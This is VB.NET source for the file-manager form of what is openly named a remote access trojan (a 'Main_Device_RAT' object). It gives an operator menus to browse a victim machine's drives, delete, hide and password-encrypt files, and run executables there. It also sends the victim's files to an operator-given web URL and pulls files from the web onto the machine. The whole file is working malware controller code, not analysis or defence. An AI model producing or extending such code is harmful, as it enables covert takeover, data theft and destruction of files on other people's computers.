Public Class File_Manager
    Public Rat As New Main_Device_RAT
    Public Attribute As String = ""
    Public NewName As String = ""
    Public Pass As String = ""
    Public fDictionary As New Dictionary(Of String, String)
    Public Dictionary As New Dictionary(Of String, String)
    Public Sub GetDrives()
        Form1.Connect()
        fDictionary.Clear()
        ListView1.Items.Clear()
        ListView2.Items.Clear()
        Dim Drives As String = Rat.GetDrives
        If Drives.Length > 0 Then
            If Drives.Contains("<") Then
                For Each Drive In Drives.Split("<")
                    fDictionary.Add(Drive, Drive)
                    ListView1.Items.Add(fDictionary(Drive), ImageList1.Images.Count - 1)
                Next
            Else
                fDictionary.Add(Drives, Drives)
                ListView1.Items.Add(fDictionary(Drives), ImageList1.Images.Count - 1)
            End If
        End If
    End Sub
    Private Sub Directories_And__Files_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        GetDrives()
    End Sub
    Private Sub ListView1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Try
            TextBox2.Text = ""
            Dim Folder As String = fDictionary(ListView1.SelectedItems.Item(0).Text)
            TextBox1.Text = Folder
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ListView2_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView2.SelectedIndexChanged
        Try
            TextBox2.Text = Dictionary(ListView2.SelectedItems.Item(0).Text)
        Catch ex As Exception
        End Try
    End Sub
    Public Sub GetFolderAndFiles()
        Try
            Form1.Connect()
            Dictionary.Clear()
            fDictionary.Clear()
            Dim folders As String = ""
            Dim files As String = ""
            Rat.GetFoldersAndFiles(TextBox1.Text, folders, files)
            ListView1.Items.Clear()
            ListView2.Items.Clear()
            If folders IsNot "" Then
                If folders.Contains("<") Then
                    For Each fod In folders.Split("<")
                        Dim fol() As String = fod.Split(">")
                        fDictionary.Add(fol(1), fol(0))
                        ListView1.Items.Add(fol(1), ImageList1.Images.Count - 1)
                    Next
                Else
                    Dim fol() As String = folders.Split(">")
                    fDictionary.Add(fol(1), fol(0))
                    ListView1.Items.Add(fol(1), ImageList1.Images.Count - 1)
                End If
            End If
            If files IsNot "" Then
                If files.Contains("<") Then
                    For Each fod In files.Split("<")
                        Dim fol() As String = fod.Split(">")
                        Dictionary.Add(fol(1), fol(0))
                        ListView2.Items.Add(fol(1), ImageList1.Images.Count - 2)
                    Next
                Else
                    Dim fol() As String = files.Split(">")
                    Dictionary.Add(fol(1), fol(0))
                    ListView2.Items.Add(fol(1), ImageList1.Images.Count - 2)
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub OpenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click
        GetFolderAndFiles()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim Txt As String = TextBox1.Text
            Dim txtl() As String = Txt.Split("\")
            Dim newtxt As String = txtl(0)
            For i = 1 To txtl.Count - 2
                newtxt = newtxt & "\" & txtl(i)
            Next
            If Not newtxt.Contains("\") And Not newtxt.Contains("/") Then
                newtxt = newtxt & "\"
            End If
            TextBox1.Text = newtxt
            GetFolderAndFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Try
            Form1.Connect()
            Rat.DeleteDirectory(TextBox1.Text)
            Button2.PerformClick()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CreateNewDirectoryToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CreateNewDirectoryToolStripMenuItem.Click
        Try
            Dim Name As String = InputBox("Write the Name", "Name")
            If TextBox1.Text.Last = "\" Then
                TextBox1.Text = TextBox1.Text & Name
            Else
                TextBox1.Text = TextBox1.Text & "\" & Name
            End If
            Form1.Connect()
            Rat.CreateDirectory(TextBox1.Text)
            Button2.PerformClick()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub InfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfoToolStripMenuItem.Click
        Try
            Form1.Connect()
            Dim Infor As String = Rat.GetDirectoryInfo(TextBox1.Text)
            Dim Inform As String() = Infor.Split("<")
            Info.RichTextBox1.Text = ""
            For Each inf In Inform
                Info.RichTextBox1.Text = Info.RichTextBox1.Text & vbNewLine & inf
            Next
            Info.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub HiddenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HiddenToolStripMenuItem.Click
        Try
            Attribute = "Hidden"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ArchiveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ArchiveToolStripMenuItem.Click
        Try
            Attribute = "Archive"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CompressedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CompressedToolStripMenuItem.Click
        Try
            Attribute = "Compressed"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DeviceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeviceToolStripMenuItem.Click
        Try
            Attribute = "Device"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DirectoryToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DirectoryToolStripMenuItem.Click
        Try
            Attribute = "Directory"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub EncryptedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EncryptedToolStripMenuItem.Click
        Try
            Attribute = "Encrypted"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
   
    Private Sub NormalToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem.Click
        Try
            Attribute = "Normal"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub NotContentIndexToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NotContentIndexToolStripMenuItem.Click
        Try
            Attribute = "NotContentIndex"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub OfflineToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OfflineToolStripMenuItem.Click
        Try
            Attribute = "Offline"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ReadOnlyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReadOnlyToolStripMenuItem.Click
        Try
            Attribute = "ReadOnly"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ReparsePointToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReparsePointToolStripMenuItem.Click
        Try
            Attribute = "ReparsePoint"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub SparseFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SparseFileToolStripMenuItem.Click
        Try
            Attribute = "SparseFile"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub SystemToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SystemToolStripMenuItem.Click
        Try
            Attribute = "System"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub TemporaryToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TemporaryToolStripMenuItem.Click
        Try
            Attribute = "Temporary"
            Form1.Connect()
            Rat.SetAttribute(TextBox1.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub InfoToolStripMenuItem1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfoToolStripMenuItem1.Click
        Try
            Form1.Connect()
            Dim Infor As String = Rat.GetFileInfo(TextBox2.Text)
            Dim Inform As String() = Infor.Split("<")
            Info.RichTextBox1.Text = ""
            For Each inf In Inform
                Info.RichTextBox1.Text = Info.RichTextBox1.Text & vbNewLine & inf
            Next
            Info.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DeleteToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem1.Click
        Try
            Form1.Connect()
            Rat.DeleteFile(TextBox2.Text)
            GetFolderAndFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Pass = InputBox("Write Password to encrypt the file", "Password")
            Form1.Connect()
            Rat.EncryptFile(TextBox2.Text, Pass)
            GetFolderAndFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DecryptToolStripMenuItem.Click
        Try
            Pass = InputBox("Write Password to decrypt the file", "Password")
            Form1.Connect()
            Rat.DecryptFile(TextBox2.Text, Pass)
            GetFolderAndFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Try
            Dim Name As String = InputBox("Write New Name", "Name")
            Dim Txt As String = TextBox2.Text
            Dim txtl() As String = Txt.Split("\")
            Dim newtxt As String = txtl(0) & "\"
            For i = 1 To txtl.Count - 2
                newtxt = newtxt & "\" & txtl(i)
            Next
            If Not newtxt.ElementAt(TextBox1.Text.Length - 1) = "\" AndAlso Not newtxt.ElementAt(TextBox1.Text.Length - 1) = "\" Then
                newtxt = newtxt & "\" & Name
            Else
                newtxt = newtxt & Name
            End If
            NewName = newtxt
            Form1.Connect()
            Rat.RenameFile(TextBox2.Text, NewName)
            GetFolderAndFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub MoveToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MoveToolStripMenuItem1.Click
        Try
                Form1.BrowsedDirectory = ""
                Browse.Button1.Text = "Select And Move The File"
                Browse.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CopyToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Form1.BrowsedDirectory = ""
            Browse.Button1.Text = "Select And Copy The File"
            Browse.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CompressToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CompressToolStripMenuItem.Click
        Try
            Form1.Connect()
            Rat.Compress(TextBox2.Text)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DecompressToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DecompressToolStripMenuItem.Click
        Try
            Form1.Connect()
            Rat.Decompress(TextBox2.Text)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub HiddenToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HiddenToolStripMenuItem1.Click
        Try
            Attribute = "Hidden"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ArchiveToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ArchiveToolStripMenuItem1.Click
        Try
            Attribute = "Archive"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CompressedToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CompressedToolStripMenuItem1.Click
        Try
            Attribute = "Compressed"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DeviceToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeviceToolStripMenuItem1.Click
        Try
            Attribute = "Device"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DirectoryToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DirectoryToolStripMenuItem1.Click
        Try
            Attribute = "Directory"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub EncryptedToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EncryptedToolStripMenuItem1.Click
        Try
            Attribute = "Encrypted"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub NormalToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem1.Click
        Try
            Attribute = "Normal"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub NotContentIndexToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NotContentIndexToolStripMenuItem1.Click
        Try
            Attribute = "NotContentIndex"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub OfflineToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OfflineToolStripMenuItem1.Click
        Try
            Attribute = "Offline"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ReadOnlyToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReadOnlyToolStripMenuItem1.Click
        Try
            Attribute = "ReadOnly"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ReparsePointToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReparsePointToolStripMenuItem1.Click
        Try
            Attribute = "ReparsePoint"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub SparseFileToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SparseFileToolStripMenuItem1.Click
        Try
            Attribute = "SparseFile"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub SystemToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SystemToolStripMenuItem1.Click
        Try
            Attribute = "System"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub TemporaryToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TemporaryToolStripMenuItem1.Click
        Try
            Attribute = "Temporary"
            Form1.Connect()
            Rat.SetAttribute(TextBox2.Text, Attribute)
            Attribute = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub MoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MoveToolStripMenuItem.Click
        Try
            Form1.BrowsedDirectory = ""
            Browse.Button1.Text = "Select And Move The Directory"
            Browse.Show()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        Try
            If TextBox2.Text.Length > 0 Then
                Download.Show()
            Else
                MsgBox("Select a file")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub RunExeFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunExeFileToolStripMenuItem.Click
        Try
            If TextBox2.Text.Contains(".exe") Then
                Form1.Connect()
                Rat.RunExecutableFile(TextBox2.Text)
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub UploadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UploadToolStripMenuItem.Click
        Try
            Dim result = Upload.OpenFileDialog1.ShowDialog()
            If result = vbOK Then
                Upload.File = Upload.OpenFileDialog1.FileName
                Dim Txt As String = Upload.File
                Dim txtl() As String
                If Txt.Contains("\") Then
                    txtl = Txt.Split("\")
                Else
                    txtl = Txt.Split("/")
                End If
                Dim newtxt As String = ""
                If Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" AndAlso Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "/" Then
                    newtxt = TextBox1.Text & "\" & txtl(txtl.Length - 1).ToString()
                Else
                    newtxt = TextBox1.Text & txtl(txtl.Length - 1).ToString()
                End If
                Upload.Path = newtxt
                Upload.Show()
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub WitoutUsernameOrPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WitoutUsernameOrPasswordToolStripMenuItem.Click
        Try
            If TextBox2.Text.Length > 0 Then
                Dim url As String = InputBox("Write Url", "Ürl")
                If url = "" Then
                    MsgBox("Sorry something went wrong")
                Else
                    Dim Name As String = InputBox("Write Name With Extension (like name.exe ) Of The File ", "FileName And Extension")
                    If Name.Length > 0 Then
                        If Not url.ElementAt(url.Length - 1) = "\" AndAlso Not url.ElementAt(url.Length - 1) = "/" Then
                            url = url & "\" & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        Else
                            url = url & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        End If
                        Dim Target As String = TextBox2.Text
                        Form1.Connect()
                        Rat.UploadToWeb(url, Target)
                    Else
                        MsgBox("SomeThing Went Wrong")
                    End If
                    End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub WithUsernameOrPasswordToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WithUsernameOrPasswordToolStripMenuItem1.Click
        Try
            If TextBox2.Text.Length > 0 Then
                Dim url As String = InputBox("Write Url", "Ürl")
                If url = "" Then
                    MsgBox("Sorry something went wrong")
                Else
                    Dim Name As String = InputBox("Write Name With Extension (like name.exe ) Of The File ", "FileName And Extension")
                    If Name.Length > 0 Then
                        Dim Target As String = TextBox2.Text
                        Dim Username As String = InputBox("Write Username", "Username")
                        Dim Password As String = InputBox("Write Password", "Password")
                        If Not url.ElementAt(url.Length - 1) = "\" AndAlso Not url.ElementAt(url.Length - 1) = "/" Then
                            url = url & "\" & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        Else
                            url = url & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        End If
                        If Username.Length > 0 AndAlso Password.Length > 0 Then
                            Form1.Connect()
                            Rat.UploadToWeb(url, Target, Username, Password)
                        Else
                            MsgBox("Sorry something went wrong")
                        End If
                    Else
                        MsgBox("SomeThing Went Wrong ")
                    End If
                    End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub WithoutUsernameOrPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WithoutUsernameOrPasswordToolStripMenuItem.Click
        Try
            If TextBox1.Text.Length > 0 Then
                Dim url As String = InputBox("Write Url", "Ürl")
                If url = "" Then
                    MsgBox("Sorry something went wrong")
                Else
                    Dim Target As String
                    Dim Name As String = InputBox("Write Name With Extension (like name.exe ) Of The File ", "FileName And Extension")
                    If Name.Length > 0 Then
                        If Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" AndAlso Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "/" Then
                            Target = TextBox1.Text & "\" & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        Else
                            Target = TextBox1.Text & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        End If
                        Form1.Connect()
                        Rat.DownloadFromWeb(url, Target)
                    Else
                        MsgBox("SomeThing Went Wrong")
                    End If
                    End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub WithUsernameOrPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WithUsernameOrPasswordToolStripMenuItem.Click
        Try
            If TextBox1.Text.Length > 0 Then
                Dim url As String = InputBox("Write Url", "Ürl")
                If url = "" Then
                    MsgBox("Sorry something went wrong")
                Else
                    Dim Target As String
                    Dim Name As String = InputBox("Write Name With Extension (like name.exe ) Of The File ", "FileName And Extension")
                    If Name.Length > 0 Then
                        If Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" AndAlso Not TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "/" Then
                            Target = TextBox1.Text & "\" & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        Else
                            Target = TextBox1.Text & Name.Replace(IO.Path.GetInvalidFileNameChars, "_")
                        End If
                        Dim Username As String = InputBox("Write Username", "Username")
                        Dim Password As String = InputBox("Write Password", "Password")
                        If Username.Length > 0 AndAlso Password.Length > 0 Then
                            Form1.Connect()
                            Rat.DownloadFromWeb(url, Target, Username, Password)
                        Else
                            MsgBox("Sorry something went wrong")
                        End If
                    Else
                        MsgBox("Something Went Wrong")
                    End If
                    End If
                End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        GetDrives()
    End Sub
    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        TextBox2.Text = ""
    End Sub
End Class